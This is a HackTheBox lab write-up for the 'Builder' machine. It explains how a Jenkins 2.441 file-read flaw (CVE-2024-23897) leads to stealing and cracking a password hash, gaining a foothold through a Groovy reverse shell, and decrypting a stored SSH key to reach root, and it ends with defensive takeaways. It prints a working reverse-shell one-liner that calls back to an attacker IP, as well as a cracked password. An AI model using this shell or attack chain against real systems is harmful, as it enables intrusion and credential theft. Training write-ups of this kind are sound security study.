---
date: 2026-05-20
draft: false
title: "HTB Write-up: Builder"
tags: ["htb", "linux", "medium", "jenkins", "lfi", "groovy", "docker", "credential-decryption", "ssh"]
description: "Jenkins 2.441 LFI to credential theft, Groovy shell for foothold, then decrypting an encrypted SSH key stored in Jenkins to reach root."
ShowToc: true
cover:
  image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a0f6d6a08e0806448341587cd59450a6.png"
  alt: "Builder"
---

Jenkins is one of those tools that organizations often spin up quickly and forget to harden. Builder is a medium-difficulty Linux box that demonstrates exactly what happens when that oversight meets a known CVE and a stored credential that wasn't meant to be found.

## Machine Info

| Field      | Value                          |
|------------|--------------------------------|
| Name       | Builder                        |
| Platform   | HackTheBox                     |
| OS         | Linux                          |
| Difficulty | Medium                         |
| IP         | 10.129.230.220                 |

## TL;DR

Jenkins 2.441 is vulnerable to a Local File Inclusion (CVE-2024-23897). The LFI lets us read arbitrary files from the server, which is enough to enumerate Jenkins users, steal a password hash, crack it, log in as that user, and execute a Groovy reverse shell from the Script Console. The shell lands inside a Docker container. From there, the Jenkins home directory contains an encrypted SSH private key in `credentials.xml`. We use `pwn_jenkins` to decrypt it with `master.key` and `hudson.util.Secret`, then SSH in as root.

## Recon

Nmap finds two ports: SSH on 22 and HTTP on 8080.

{{< figure src="/images/htb-builder/nmap.png" alt="Nmap showing SSH on 22 and Jenkins on 8080" >}}

Port 8080 is running Jetty 10.0.18 with the title "Dashboard [Jenkins]" -- and the version is right there in the footer: **Jenkins 2.441**.

## Enumeration

{{< figure src="/images/htb-builder/jenkins-login.png" alt="Jenkins 2.441 welcome page" >}}

The instance is unauthenticated from the outside -- you can see the dashboard but can't do much without credentials. Version 2.441 is a specific string worth running through searchsploit:

{{< figure src="/images/htb-builder/searchsploit.png" alt="searchsploit finding Jenkins 2.441 LFI" >}}

**Jenkins 2.441 - Local File Inclusion**. This is [CVE-2024-23897](https://www.jenkins.io/security/advisory/2024-01-24/), a vulnerability in the Jenkins CLI's argument file processing. The `@` operator used in CLI arguments can be abused to read arbitrary files from the server's filesystem. ExploitDB has a Python script (51993.py) that automates this.

First test: read `/etc/passwd` to confirm the LFI works and gather user info.

{{< figure src="/images/htb-builder/lfi-passwd.png" alt="LFI reading /etc/passwd and showing the jenkins user" >}}

The jenkins user's home is `/var/jenkins_home` -- that's the base directory for everything Jenkins stores: configs, credentials, plugins, user data.

Jenkins stores user accounts under `/var/jenkins_home/users/users.xml`. This file is a map of usernames to their hashed directory names.

{{< figure src="/images/htb-builder/lfi-users-xml.png" alt="LFI reading users.xml and finding jennifer" >}}

There's one user: **jennifer**, with the hashed directory name `jennifer_12108429903186576833`. Jenkins stores each user's config (including password hash) at `/var/jenkins_home/users/<hash>/config.xml`.

{{< figure src="/images/htb-builder/lfi-config-start.png" alt="LFI reading jennifer's config.xml" >}}

The config contains a bcrypt password hash:

{{< figure src="/images/htb-builder/password-hash.png" alt="jennifer's bcrypt password hash" >}}

```
#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```

Strip the `#jbcrypt:` prefix and hand it to john:

{{< figure src="/images/htb-builder/john-cracked.png" alt="john cracking the hash to princess" >}}

Password: **princess**. Now we can log in as jennifer.

## Foothold

Logged in, the Script Console is available at `/script`. This is a Groovy REPL that executes code with full access to the Jenkins runtime -- and by extension, the underlying system.

{{< figure src="/images/htb-builder/jennifer-script-console.png" alt="Jennifer's Jenkins Script Console" >}}

The standard Groovy reverse shell (from [frohoff's gist](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)) is a Java-based one-liner that opens a socket and pipes stdin/stdout to a bash process:

```groovy
String host="10.10.14.2";int port=443;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

{{< figure src="/images/htb-builder/shell-jenkins.png" alt="Reverse shell caught as the jenkins user" >}}

Shell as `jenkins` (uid=1000). The `uname -a` shows this is a Linux kernel -- but the hostname `0f52c222a4cc` looks like a container ID.

## Privilege Escalation

Checking the root of the filesystem confirms the suspicion:

{{< figure src="/images/htb-builder/docker-ls.png" alt="ls -la / showing .dockerenv confirming Docker container" >}}

The `.dockerenv` file is the telltale sign -- we're inside a Docker container. The actual host is somewhere above us.

The Jenkins home directory is the key:

{{< figure src="/images/htb-builder/jenkins-home-ls.png" alt="ls -la /var/jenkins_home showing credentials.xml and secrets" >}}

Several interesting files here:
- `credentials.xml` -- stores Jenkins credentials, potentially encrypted
- `secrets/` directory -- contains the encryption keys Jenkins uses
- `secret.key` and `hudson.util.Secret`
- `user.txt` is right there in the home directory

{{< figure src="/images/htb-builder/user-flag.png" alt="user.txt in /var/jenkins_home" >}}

The `credentials.xml` file contains a `BasicSSHUserPrivateKey` entry. Jenkins encrypts stored credentials using AES with keys derived from `master.key` and `hudson.util.Secret` (both in the `secrets/` directory). The key itself isn't directly readable, but if you have all three files, you can decrypt offline.

[pwn_jenkins](https://github.com/gquere/pwn_jenkins) has an offline decryption script that does exactly this. Pull the three files from the server via LFI and run the decryptor:

{{< figure src="/images/htb-builder/pwn-jenkins-decrypt.png" alt="pwn_jenkins decrypting the SSH private key from credentials.xml" >}}

The script spits out a PEM-formatted SSH private key. Save it, set permissions to 600, and SSH in as root:

{{< figure src="/images/htb-builder/root-shell.png" alt="SSH as root with the decrypted key and root.txt" >}}

## Takeaways

- **Jenkins LFI is deceptively powerful**: CVE-2024-23897 doesn't give direct code execution, but being able to read arbitrary files from a Jenkins server is almost as good. User configs, credential stores, secret keys -- everything lives on disk and is readable if you know the paths.
- **Encrypted credentials are only as safe as their keys**: Jenkins AES encryption is solid in theory, but if an attacker can read `master.key`, `hudson.util.Secret`, and `credentials.xml` from the same filesystem, the encryption is effectively worthless. Secrets and the data they protect shouldn't live in the same place.
- **Script Console = instant RCE**: any Jenkins user with Script Console access can execute arbitrary Groovy code. Restricting this to administrators only (and auditing who has admin) is non-negotiable.
- **Docker doesn't mean safe**: escaping a Jenkins container by abusing credentials stored inside the container is a common real-world path. Just because something is containerized doesn't mean lateral movement stops there.

## References

- [CVE-2024-23897 - Jenkins LFI Advisory](https://www.jenkins.io/security/advisory/2024-01-24/)
- [ExploitDB 51993 - Jenkins 2.441 LFI PoC](https://www.exploit-db.com/exploits/51993)
- [pwn_jenkins - Offline Jenkins Credential Decryption](https://github.com/gquere/pwn_jenkins)
- [Groovy Reverse Shell - frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
